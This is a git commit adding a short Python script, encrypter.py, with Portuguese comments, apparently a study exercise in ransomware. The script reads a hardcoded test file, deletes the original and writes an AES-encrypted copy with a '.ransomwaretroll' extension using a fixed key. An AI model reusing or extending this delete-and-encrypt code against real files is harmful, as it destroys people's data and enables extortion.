22d2c43a325489cec6a1630fe10833397a679cb5
Gabriel Ramalho <103615988+bielramalho@users.noreply.github.com>
2024-01-27 17:21:27 -0300

    encrypter.py

---
+++ encrypter.py
@@ -0,0 +1,29 @@
+import os
+import pyaes
+
+## Abrir o arquivo a ser criptografado
+
+file_name = 'teste.txt'
+file = open (file_name, 'rb')
+file_data = file.read()
+file.close()
+
+## Remover o arquivo original
+
+os.remove(file_name)
+
+## Definir a chave de criptacao
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## Criptografar o arquivo
+
+crypto_data = aes.encrypt(file_data)
+
+## Salvar o arquivo criptografado
+
+new_file = file_name + '.ransomwaretroll'
+new_file = open(f'{new_file}', 'wb')
+new_file.write(crypto_data)
+new_file.close()
